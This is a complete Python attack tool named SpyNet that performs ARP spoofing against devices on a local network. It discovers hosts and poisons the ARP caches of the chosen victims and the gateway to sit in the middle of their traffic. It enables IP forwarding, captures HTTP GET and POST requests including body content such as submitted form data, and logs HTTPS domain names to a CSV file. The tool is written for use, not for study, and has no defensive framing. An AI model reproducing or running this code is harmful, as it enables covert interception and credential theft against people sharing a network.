#!/usr/bin/env python3
import scapy.all as scapy
import time
import platform
import argparse
import netifaces
from colorama import Fore as mandonga, Style as utopolo
import re
import sys
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from datetime import datetime
import logging
import threading
import csv
import subprocess
import os
import itertools

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
console = Console()

# Animation characters
ANIMATION = itertools.cycle(['🌐', '🔒', '💻', '⚡'])

def animated_logo():
    logo = """
    ███████╗██████╗ ██╗   ██╗███╗   ██╗███████╗████████╗
    ██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
    ███████╗██████╔╝ ╚████╔╝ ██╔██╗ ██║█████╗     ██║   
    ╚════██║██╔═══╝   ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
    ███████║██║        ██║   ██║ ╚████║███████╗   ██║   
    ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                      S P Y N E T
    """
    console.print("\n[bold]SpyNet - Advanced ARP Spoofing Engine[/bold]")
    for _ in range(10):
        sys.stdout.write(f'\r{mandonga.RED}{logo}{utopolo.RESET_ALL}')
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write('\r' + ' ' * 50 + '\r')
    loading_animation("Initializing SpyNet", duration=3, color=mandonga.CYAN)

def loading_animation(message, duration=5, color=mandonga.YELLOW):
    for _ in itertools.cycle(ANIMATION):
        sys.stdout.write(f'\r[{color}]{message} {_}[{utopolo.RESET_ALL}]')
        sys.stdout.flush()
        time.sleep(0.1)
        duration -= 0.1
        if duration <= 0:
            break
    sys.stdout.write('\r' + ' ' * (len(message) + 10) + '\r')

def check_os(supported=['Linux', 'Unix']):
    try:
        loading_animation(f'[Os-check] Checking Operating System', color=mandonga.CYAN)
        os_type = platform.system()
        if os_type not in supported:
            console.print(f"[bold red][ERROR]: Only run this program on {', '.join(supported)} systems![/bold red]")
            sys.exit(1)
        console.print(f"[bold green][✓] OS Verified: {os_type}[/bold green]")
        return os_type
    except Exception as e:
        console.print(f"[bold red][ERROR]: Failed to check OS: {e}[/bold red]")
        sys.exit(1)

def is_root():
    return os.geteuid() == 0

def get_available_interfaces():
    """Display available network interfaces and return the selected one."""
    console.print("\n[bold cyan]Available Network Interfaces:[/bold cyan]")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Index", style="dim")
    table.add_column("Interface", style="green")
    
    interfaces = netifaces.interfaces()
    for idx, iface in enumerate(interfaces):
        table.add_row(str(idx), iface)
    
    console.print(table)
    while True:
        selection = Prompt.ask("\n[bold yellow]Select interface by number:[/bold yellow]", default="0")
        try:
            idx = int(selection.strip())
            if 0 <= idx < len(interfaces):
                selected_iface = interfaces[idx]
                console.print(f"[bold green][✓] Selected Interface: {selected_iface}[/bold green]")
                return selected_iface
            else:
                console.print(f"[bold red][ERROR]: Invalid index {idx}[/bold red]")
        except ValueError:
            console.print("[bold red][ERROR]: Please enter a valid number[/bold red]")

def get_network_info(interface):
    """Get the network IP range and gateway for the given interface."""
    try:
        loading_animation(f'Detecting network info for {interface}', color=mandonga.BLUE)
        addrs = netifaces.ifaddresses(interface)
        ip_info = addrs[netifaces.AF_INET][0]
        ip_address = ip_info['addr']
        netmask = ip_info['netmask']
        # Calculate the network range
        ip_parts = ip_address.split('.')
        mask_parts = netmask.split('.')
        network = '.'.join(str(int(ip) & int(mask)) for ip, mask in zip(ip_parts, mask_parts))
        # Gateway IP
        gateways = netifaces.gateways()
        gateway = gateways['default'][netifaces.AF_INET][0]
        # Calculate CIDR notation
        mask_bits = sum(bin(int(x)).count('1') for x in mask_parts)
        ip_range = f"{network}/{mask_bits}"
        console.print(f"[bold green][✓] Network: {ip_range}, Gateway: {gateway}[/bold green]")
        return ip_range, gateway
    except Exception as e:
        console.print(f"[bold red][ERROR]: Failed to get network info: {e}[/bold red]")
        sys.exit(1)

def scan_network(ip_range):
    """Scan the network for devices and return a list of (IP, MAC) tuples."""
    try:
        loading_animation(f'Scanning network {ip_range}', duration=10, color=mandonga.MAGENTA)
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
        devices = [(ans[1].psrc, ans[1].hwsrc) for ans in answered]
        return devices
    except Exception as e:
        console.print(f"[bold red][ERROR]: Network scan failed: {e}[/bold red]")
        sys.exit(1)

def display_devices(devices, gateway):
    """Display a list of devices (excluding gateway) for user selection."""
    console.print("\n[bold cyan]Discovered Devices (Excluding Gateway):[/bold cyan]")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Index", style="dim")
    table.add_column("IP Address", style="green")
    table.add_column("MAC Address", style="yellow")
    
    device_list = [(ip, mac) for ip, mac in devices if ip != gateway]
    for idx, (ip, mac) in enumerate(device_list):
        table.add_row(str(idx), ip, mac)
    
    console.print(table)
    return device_list

def select_targets(device_list):
    """Allow user to select targets (single, multiple, or all)."""
    console.print("\n[bold yellow]Select targets to spoof:[/bold yellow]")
    console.print("Enter index numbers (e.g., '0', '0,1,2', 'all'):")
    selection = Prompt.ask("Your choice", default="all")
    
    selected_targets = []
    if selection.lower() == "all":
        selected_targets = device_list
    else:
        indices = selection.split(',')
        try:
            for idx in indices:
                idx = int(idx.strip())
                if 0 <= idx < len(device_list):
                    selected_targets.append(device_list[idx])
                else:
                    console.print(f"[bold red][ERROR]: Invalid index {idx}[/bold red]")
                    sys.exit(1)
        except ValueError:
            console.print("[bold red][ERROR]: Invalid input, please enter numbers or 'all'[/bold red]")
            sys.exit(1)
    
    if not selected_targets:
        console.print("[bold red][ERROR]: No valid targets selected[/bold red]")
        sys.exit(1)
    
    console.print(f"[bold green][✓] Selected Targets: {', '.join(ip for ip, _ in selected_targets)}[/bold green]")
    return selected_targets

def get_output_filename():
    """Prompt user for output filename with .csv extension and location."""
    while True:
        filename = Prompt.ask("\n[bold yellow]Enter output filename (must end with .csv) and location (e.g., /path/to/file.csv):[/bold yellow]")
        if filename.endswith('.csv'):
            if os.path.dirname(filename) and not os.path.exists(os.path.dirname(filename)):
                console.print(f"[bold red][ERROR]: Directory {os.path.dirname(filename)} does not exist[/bold red]")
            else:
                console.print(f"[bold green][✓] Output will be saved to: {filename}[/bold green]")
                return filename
        else:
            console.print("[bold red][ERROR]: Filename must end with .csv[/bold red]")

def get_arguments():
    parser = argparse.ArgumentParser(description="SpyNet - Advanced ARP Spoofing Engine")
    parser.add_argument("-o", "--output", dest="output_file", help="File to save captured POST data (optional)", default=None)
    options = parser.parse_args()
    return get_available_interfaces(), options.output_file

def ip_is_valid(ip):
    return bool(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip))

def get_mac(ip):
    try:
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_broadcast_packet = broadcast_packet / arp_packet
        answered = scapy.srp(arp_broadcast_packet, timeout=5, verbose=False)[0]
        return answered[0][1].hwsrc if answered else None
    except Exception as e:
        console.print(f"[bold red][ERROR] Failed to get MAC for {ip}: {e}[/bold red]")
        return None

def spoof(target_ip, spoof_ip, target_mac):
    if not target_mac:
        return
    try:
        arp_spoof_response = scapy.ARP(op=2, hwdst=target_mac, psrc=spoof_ip, pdst=target_ip)
        scapy.send(arp_spoof_response, verbose=False)
        console.print(f"[cyan][+] Spoofing {target_ip} with {spoof_ip}[/cyan]")
    except Exception as e:
        console.print(f"[bold red][ERROR] Spoofing failed for {target_ip}: {e}[/bold red]")

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    if not target_mac or not spoof_mac:
        return
    try:
        loading_animation(f'Restoring ARP for {target_ip}', duration=1, color=mandonga.GREEN)
        arp_restore_response = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=spoof_mac, hwdst=target_mac)
        scapy.send(arp_restore_response, verbose=False, count=4)
        console.print(f"[bold green][+] Restored ARP for {target_ip}[/bold green]")
    except Exception as e:
        console.print(f"[bold red][ERROR] Restore failed for {target_ip}: {e}[/bold red]")

def display_status(gateway, targets, gateway_mac, sent_packets_counter):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    target_list = ", ".join(targets[:3]) + ("..." if len(targets) > 3 else "")
    console.print(f"{current_time} - [bold magenta]Attacking: {gateway} ({gateway_mac}) <-> {target_list} ({sent_packets_counter} packets sent)[/bold magenta]")

def http_sniffer(packet, http_table, https_table, output_file):
    if not packet.haslayer(scapy.IP):
        return
    try:
        timestamp = str(datetime.now())
        src_ip = packet[scapy.IP].src
        dst_ip = packet[scapy.IP].dst
        dport = packet[scapy.TCP].dport if packet.haslayer(scapy.TCP) else None

        # Handle HTTP (port 80)
        if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP) and dport == 80:
            payload = packet[scapy.Raw].load.decode(errors='ignore')
            if 'GET' in payload[:100] or 'POST' in payload[:100]:
                request_type = 'POST' if 'POST' in payload[:100] else 'GET'
                lines = payload.split('\r\n')
                request_line = lines[0].strip() if lines else ''
                url = None
                if request_line:
                    parts = request_line.split()
                    if len(parts) >= 2 and parts[0] in ('GET', 'POST'):
                        path = parts[1]
                        url = f"http://{dst_ip}{path}"
                headers = [line for line in lines if ': ' in line]
                body = lines[-1] if lines[-1] else ''
                header = headers[0] if headers else 'No headers'
                body_preview = body[:200]
                http_table.add_row(timestamp, request_type, url or 'N/A', src_ip, dst_ip, header, body_preview)
                console.print(http_table)
                if output_file and request_type == 'POST':
                    with open(output_file, 'a', newline='') as csvfile:
                        csvwriter = csv.writer(csvfile)
                        csvwriter.writerow([timestamp, 'HTTP', request_type, url or 'N/A', src_ip, dst_ip, header, body_preview])

        # Handle HTTPS (port 443) - Extract SNI for domain
        elif packet.haslayer(scapy.TCP) and dport == 443 and packet.haslayer('TLS'):
            sni = None
            # Check for TLS Client Hello to extract SNI
            if hasattr(packet, 'TLS') and hasattr(packet.TLS, 'msg'):
                for msg in packet.TLS.msg:
                    if hasattr(msg, 'ext'):
                        for ext in msg.ext:
                            if hasattr(ext, 'servernames') and ext.servernames:
                                sni = ext.servernames[0].servername.decode('utf-8')
                                break
            if sni:
                https_table.add_row(timestamp, 'HTTPS', sni, src_ip, dst_ip)
                console.print(https_table)
                if output_file:
                    with open(output_file, 'a', newline='') as csvfile:
                        csvwriter = csv.writer(csvfile)
                        csvwriter.writerow([timestamp, 'HTTPS', 'HTTPS', sni, src_ip, dst_ip, '', ''])

    except Exception as e:
        console.print(f"[bold red][ERROR] Sniffer error: {e}[/bold red]")

def start_http_sniffer(output_file):
    # Initialize CSV file with headers if saving is enabled
    if output_file:
        with open(output_file, 'w', newline='') as csvfile:
            csvwriter = csv.writer(csvfile)
            csvwriter.writerow(["Timestamp", "Protocol", "Type", "URL/Domain", "Source IP", "Destination IP", "Header", "Body"])

    # HTTP Table
    http_table = Table(show_header=True, header_style="bold magenta")
    http_table.add_column("Timestamp", style="dim")
    http_table.add_column("Type", style="cyan")
    http_table.add_column("URL", style="blue")
    http_table.add_column("Source IP", style="green")
    http_table.add_column("Destination IP", style="green")
    http_table.add_column("Header", style="yellow")
    http_table.add_column("Body", style="white")

    # HTTPS Table (different structure)
    https_table = Table(show_header=True, header_style="bold red")
    https_table.add_column("Timestamp", style="dim")
    https_table.add_column("Type", style="cyan")
    https_table.add_column("Domain", style="blue")
    https_table.add_column("Source IP", style="green")
    https_table.add_column("Destination IP", style="green")

    # Sniff both HTTP (port 80) and HTTPS (port 443)
    scapy.sniff(filter="tcp port 80 or tcp port 443", prn=lambda pkt: http_sniffer(pkt, http_table, https_table, output_file), store=False)

def arp_spoofing(gateway, targets, gateway_mac, output_file):
    sent_packets_counter = 0
    try:
        with Progress(
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(bar_width=50),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeRemainingColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[bold cyan]Spoofing in Progress...", total=None)
            while True:
                for target_ip in targets:
                    mac = get_mac(target_ip)
                    if mac:
                        spoof(target_ip, gateway, mac)
                        spoof(gateway, target_ip, gateway_mac)
                        sent_packets_counter += 2
                if sent_packets_counter % 2 == 0:
                    display_status(gateway, targets, gateway_mac, sent_packets_counter)
                progress.update(task, advance=1)
                time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Shutting down SpyNet...[/bold yellow]")
        for _ in range(3, 0, -1):
            sys.stdout.write(f'\r{mandonga.RED}[!] Terminating in {_}... 🌙{utopolo.RESET_ALL}')
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write('\r' + ' ' * 20 + '\r')
        for target_ip in targets:
            mac = get_mac(target_ip)
            if mac:
                restore(target_ip, gateway, mac, gateway_mac)
                restore(gateway, target_ip, gateway_mac, mac)
        console.print(f"\n[bold green]🎉 SpyNet shutdown complete! Happy hacking! 🎉[/bold green]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[bold red][X] Error: {e}[/bold red]")
        for target_ip in targets:
            mac = get_mac(target_ip)
            if mac:
                restore(target_ip, gateway, mac, gateway_mac)
                restore(gateway, target_ip, gateway_mac, mac)
        sys.exit(1)

if __name__ == "__main__":
    animated_logo()
    check_os()
    if not is_root():
        loading_animation(f'[Root-check] Checking if we are root', color=mandonga.MAGENTA)
        console.print("[bold red][!] Please run the script as root[/bold red]")
        sys.exit(1)

    # Enable IP forwarding safely
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
        loading_animation(f"[INFO] IP forwarding enabled", color=mandonga.GREEN)
    except Exception as e:
        console.print(f"[bold red][ERROR] Failed to enable IP forwarding: {e}[/bold red]")
        sys.exit(1)

    interface, default_output_file = get_arguments()
    ip_range, gateway = get_network_info(interface)
    devices = scan_network(ip_range)
    device_list = display_devices(devices, gateway)
    selected_targets = select_targets(device_list)

    # Ask if user wants to save results and start sniffing immediately
    save_choice = Prompt.ask("\n[bold yellow]Do you want to save the results? (y/n):[/bold yellow]", default="y").lower()
    output_file = None
    if save_choice == 'y':
        output_file = get_output_filename() if default_output_file is None else default_output_file
    else:
        console.print("[bold yellow][!] Results will not be saved[/bold yellow]")

    # Start sniffing before spoofing
    sniffer_thread = threading.Thread(target=start_http_sniffer, args=(output_file,), daemon=True)
    sniffer_thread.start()

    # Extract IPs and MACs
    targets = [ip for ip, _ in selected_targets]
    macs = {ip: mac for ip, mac in selected_targets}
    gateway_mac = get_mac(gateway)
    if not gateway_mac:
        console.print(f"[bold red][ERROR] Failed to get gateway MAC for {gateway}, exiting...[/bold red]")
        sys.exit(1)

    # Start ARP spoofing
    console.print(f"[bold cyan][INFO] Starting ARP spoofing and sniffing HTTP/HTTPS traffic...[/bold cyan]")
    arp_spoofing(gateway, targets, gateway_mac, output_file)
